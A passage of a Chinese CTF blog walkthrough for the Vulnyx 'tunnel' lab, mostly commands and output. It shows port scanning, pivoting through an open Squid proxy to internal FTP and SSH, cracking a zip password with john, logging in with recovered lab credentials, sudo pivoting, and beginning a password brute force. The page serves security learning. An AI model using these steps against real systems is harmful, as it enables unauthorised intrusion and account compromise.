@@ -1,0 +1,258 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>Vulnyx-tunnel | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:hard kali:192.168.31.34 靶机:192.168.31.201 端口扫描root@kali2 [&#x2F;tmp] ➜  nmap 192.168.31.201                                                             [10:15:01] Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.or">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnyx-tunnel">
+<meta property="og:url" content="https://tao0845.github.io/posts/66723be2/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="难度:hard kali:192.168.31.34 靶机:192.168.31.201 端口扫描root@kali2 [&#x2F;tmp] ➜  nmap 192.168.31.201                                                             [10:15:01] Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.or">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/12/16/OEMEaK.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/12/16/OEMGea.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/12/16/OEMQES.png">
+<meta property="article:published_time" content="2024-12-16T02:12:16.188Z">
+<meta property="article:modified_time" content="2024-12-16T04:40:23.273Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="squid">
+<meta property="article:tag" content="clush">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/12/16/OEMEaK.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">98</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">153</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#squid%E4%BB%A3%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">squid代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#clush%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">clush提权</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/66723be2/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Vulnyx-tunnel</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-12-16 10:12:16" itemprop="dateCreated datePublished" datetime="2024-12-16T10:12:16+08:00">2024-12-16</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">8m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Vulnyx/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Vulnyx</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/squid/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">squid</span></a><a class="tag-item" href="/tags/clush/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">clush</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:hard</strong></p>
+<p><strong>kali:192.168.31.34</strong></p>
+<p><strong>靶机:192.168.31.201</strong></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  nmap <span class="token number">192.168</span>.31.201                                                             <span class="token punctuation">[</span><span class="token number">10</span>:15:01<span class="token punctuation">]</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-12-16 <span class="token number">10</span>:15 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.31.201
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000073s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT     STATE SERVICE
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
+<span class="token number">3128</span>/tcp <span class="token function">open</span>  squid-http
+MAC Address: 08:00:27:98:5D:F2 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.75</span> seconds</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token variable">$IP</span> -p80,3128                                                       <span class="token punctuation">[</span><span class="token number">10</span>:15:44<span class="token punctuation">]</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-12-16 <span class="token number">10</span>:15 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.31.201
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00033s latency<span class="token punctuation">)</span>.
+
+PORT     STATE SERVICE    VERSION
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http       Apache httpd <span class="token number">2.4</span>.62 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-server-header: Apache/2.4.62 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Apache2 Debian Default Page: It works
+<span class="token number">3128</span>/tcp <span class="token function">open</span>  http-proxy Squid http proxy <span class="token number">5.7</span>
+<span class="token operator">|</span>_http-title: ERROR: The requested URL could not be retrieved
+<span class="token operator">|</span>_http-server-header: squid/5.7
+MAC Address: 08:00:27:98:5D:F2 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
+Device type: general purpose
+Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span></code></pre>
+
+<p>只有80和3128没有ssh,有意思</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://ooo.0x0.ooo/2024/12/16/OEMEaK.png" alt="OEMEaK.png" loading="lazy"><br>80端口就是一个apache的默认界面，扫一下目录</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.31.201/  <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      <span class="token punctuation">[</span><span class="token number">10</span>:16:29<span class="token punctuation">]</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.6
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.31.201/
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">10701</span><span class="token punctuation">]</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/javascript           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">321</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.31.201/javascript/<span class="token punctuation">]</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span></code></pre>
+<p>扫一半就知道不用骚了，肯定不在这个端口<br>研究下3128端口</p>
+<h2 id="squid代理"><a href="#squid代理" class="headerlink" title="squid代理"></a>squid代理</h2><p><img src="https://ooo.0x0.ooo/2024/12/16/OEMGea.png" alt="OEMGea.png" loading="lazy"><br>上网收集信息知道Squid是个缓存和转发的http网络代理</p>
+<pre class="language-none"><code class="language-none">Squid 是一个缓存和转发的 HTTP 网络代理。它有多种用途，包括通过缓存重复请求来加速 Web 服务器，为共享网络资源的一组人缓存 Web、DNS 和其他计算机网络查找，以及通过过滤流量来帮助安全性。虽然主要用于 HTTP 和 FTP，Squid 还有限度支持其他几种协议，包括 Internet Gopher、SSL、TLS 和 HTTPS。与 Privoxy 不同，Squid 不支持 SOCKS 协议，但可以与 Privoxy 一起使用以提供 SOCKS 支持</code></pre>
+<p>加个proxy先</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">tail</span> /etc/proxychains4.conf                                                                                    <span class="token punctuation">[</span><span class="token number">11</span>:25:27<span class="token punctuation">]</span>
+<span class="token comment">#       proxy types: http, socks4, socks5, raw</span>
+<span class="token comment">#         * raw: The traffic is simply forwarded to the proxy without modification.</span>
+<span class="token comment">#        ( auth types supported: "basic"-http  "user/pass"-socks )</span>
+<span class="token comment">#</span>
+<span class="token punctuation">[</span>ProxyList<span class="token punctuation">]</span>
+<span class="token comment"># add proxy here ...</span>
+<span class="token comment"># meanwile</span>
+<span class="token comment"># defaults set to "tor"</span>
+<span class="token comment">#socks4         127.0.0.1 9050</span>
+http <span class="token number">192.168</span>.31.201 <span class="token number">3128</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4 nmap <span class="token number">127.0</span>.0.1  <span class="token parameter variable">-sT</span> <span class="token parameter variable">-n</span>
+
+<span class="token punctuation">..</span>.
+<span class="token punctuation">..</span>.
+Nmap scan report <span class="token keyword">for</span> <span class="token number">127.0</span>.0.1
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0014s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
+PORT   STATE SERVICE
+<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span></code></pre>
+<p>加上代理之后扫出来21 22 端口</p>
+<pre class="language-bahs" data-language="bahs"><code class="language-bahs">root@kali2 [&#x2F;tmp] ➜  proxychains4 ftp 127.0.0.1                                                                                     [11:32:53]
+[proxychains] config file found: &#x2F;etc&#x2F;proxychains.conf
+[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  192.168.31.201:3128  ...  127.0.0.1:21  ...  OK
+Connected to 127.0.0.1.
+220 pyftpdlib 2.0.1 ready.
+Name (127.0.0.1:root): anonymous
+331 Username ok, send password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering extended passive mode (|||54527|).
+[proxychains] Strict chain  ...  192.168.31.201:3128  ...  127.0.0.1:54527 &lt;--denied
+ftp: Can&#39;t connect to &#96;127.0.0.1:54527&#39;: Connection refused
+501 Rejected data connection to foreign address 192.168.31.34:38951.
+ftp: Can&#39;t bind for data connection: Address already in use</code></pre>
+<p>ftp用不了，看了群主优雅的方案用来lftp</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  lftp                                                                                                           <span class="token punctuation">[</span><span class="token number">11</span>:34:43<span class="token punctuation">]</span>
+lftp :~<span class="token operator">></span> <span class="token builtin class-name">set</span> ftp:proxy http://192.168.31.201:3128
+lftp :~<span class="token operator">></span> <span class="token function">open</span> ftp://127.0.0.1 
+lftp <span class="token number">127.0</span>.0.1:~<span class="token operator">></span> <span class="token function">ls</span>
+drwxr-xr-x  --  <span class="token builtin class-name">.</span>
+drwxr-xr-x  --  <span class="token punctuation">..</span>
+drwxr-xr-x  --  /
+-rw-r--r--  --  confidential.zip
+lftp <span class="token number">127.0</span>.0.1:~<span class="token operator">></span> get confidential.zip 
+<span class="token number">27239</span> bytes transferred
+lftp <span class="token number">127.0</span>.0.1:~<span class="token operator">></span> <span class="token builtin class-name">exit</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  zip2john confidential.zip <span class="token operator">></span> aaa                                                                                <span class="token punctuation">[</span><span class="token number">11</span>:36:26<span class="token punctuation">]</span>
+ver <span class="token number">2.0</span> efh <span class="token number">5455</span> efh <span class="token number">7875</span> confidential.zip/welcome.pdf PKZIP Encr: TS_chk, <span class="token assign-left variable">cmplen</span><span class="token operator">=</span><span class="token number">27051</span>, <span class="token assign-left variable">decmplen</span><span class="token operator">=</span><span class="token number">29042</span>, <span class="token assign-left variable">crc</span><span class="token operator">=</span>E69221CC <span class="token assign-left variable">ts</span><span class="token operator">=</span>A48F <span class="token assign-left variable">cs</span><span class="token operator">=</span>a48f <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token number">8</span>
+root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  john aaa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt                                                           <span class="token punctuation">[</span><span class="token number">11</span>:36:33<span class="token punctuation">]</span>
+Using default input encoding: UTF-8
+Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>PKZIP <span class="token punctuation">[</span><span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Warning: invalid UTF-8 seen reading ~/.john/john.pot
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+miami            <span class="token punctuation">(</span>confidential.zip/welcome.pdf<span class="token punctuation">)</span>     
+1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-12-16 <span class="token number">11</span>:36<span class="token punctuation">)</span> <span class="token number">100</span>.0g/s 582400p/s 582400c/s 582400C/s myboo<span class="token punctuation">..</span>chocolat
+Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">unzip</span> confidential.zip                                                                                         <span class="token punctuation">[</span><span class="token number">11</span>:36:58<span class="token punctuation">]</span>
+Archive:  confidential.zip
+<span class="token punctuation">[</span>confidential.zip<span class="token punctuation">]</span> welcome.pdf password: 
+  inflating: welcome.pdf</code></pre>
+<p>拿到一个pdf<br><img src="https://ooo.0x0.ooo/2024/12/16/OEMQES.png" alt="OEMQES.png" loading="lazy"><br>拿到一组账号密码<code>m.davis:d@v1$123</code>,直接ssh登录就行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  proxychains4 <span class="token function">ssh</span> m.davis@127.0.0.1                                                                                                                                                                       <span class="token punctuation">[</span><span class="token number">11</span>:39:57<span class="token punctuation">]</span>
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.31.201:3128  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:22  <span class="token punctuation">..</span>.  OK
+m.davis@127.0.0.1<span class="token string">'s password: 
+Permission denied, please try again.
+m.davis@127.0.0.1'</span>s password: 
+m.davis@tunnel:~$ </code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">m.davis@tunnel:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> m.davis on tunnel:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty
+
+User m.davis may run the following commands on tunnel:
+    <span class="token punctuation">(</span>j.harris<span class="token punctuation">)</span> NOPASSWD: /usr/bin/bash
+m.davis@tunnel:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> j.harris /usr/bin/bash
+j.harris@tunnel:/home/m.davis$ <span class="token builtin class-name">cd</span> ~
+j.harris@tunnel:~$ <span class="token function">ls</span>
+user.txt
+j.harris@tunnel:~$ <span class="token function">cat</span> user.txt 
+ddaa10f6934a0b5095b06f7716e55fc4</code></pre>
+<p>然后就卡在了这里，无奈之下只能爆破一下j.harris的密码，看看有啥sudo权限<br>先用h开头生产一个字典</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> /usr/share/wordlists/rockyou.txt<span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'^h'</span> <span class="token operator">></span> pass.txt </code></pre>
+<p>然后因为靶机没有什么依赖就下个suForce进行密码爆破</p>
